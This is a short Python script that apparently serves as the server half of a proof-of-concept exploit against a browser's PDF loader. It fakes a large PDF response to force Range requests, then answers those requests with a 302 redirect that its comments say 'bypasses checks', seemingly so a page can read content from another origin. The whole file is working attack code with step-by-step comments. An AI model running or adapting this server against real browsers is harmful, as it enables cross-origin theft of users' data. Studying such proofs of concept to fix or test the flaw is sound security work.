#!/usr/bin/env python

try:  # Py2
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
    from urllib2 import urlopen, Request
except ImportError:  # Py3
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.request import urlopen, Request


class HeadRequest(Request):
    def get_method(self):
        return "HEAD"

    def doGetHeader(self, name):
        return urlopen(self).info()[name]


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        REDIRECT_PREFIX = '/REDIRECT/'
        if self.path.startswith(REDIRECT_PREFIX):
            redirectUrl = self.path[len(REDIRECT_PREFIX):]
            if self.headers.get('Range'):
                # Step 3: Redirect that bypasses checks
                self.send_response(302)
                self.send_header('Cache-Control', 'no-cache')
                self.send_header('Location', redirectUrl)
                self.end_headers()
                return

            # Step 2 preparation: Try to get the content size.
            # The exploit does not require it, but let's do it just in
            # case an exact match of the content length becomes important.
            l = HeadRequest(redirectUrl).doGetHeader('Content-Length')
            l = int(l) if l else 0
            # Content-Length must be set to at least kMinFileSize in
            # document_loader.h to force Range requests.
            if l <= 64 * 1024:
                l = 64 * 1024 + 1

            # Step 2: Send response
            self.send_response(200)
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Accept-Ranges', 'bytes')
            self.send_header('Content-Type', 'application/pdf')
            self.send_header('Content-Length', str(l))
            self.end_headers()
            return

        # Step 1: Load page
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        with open('index.html', 'rb') as f:
            self.wfile.write(f.read())

server = HTTPServer(('127.0.0.1', 8080), MyHandler)
server.serve_forever()
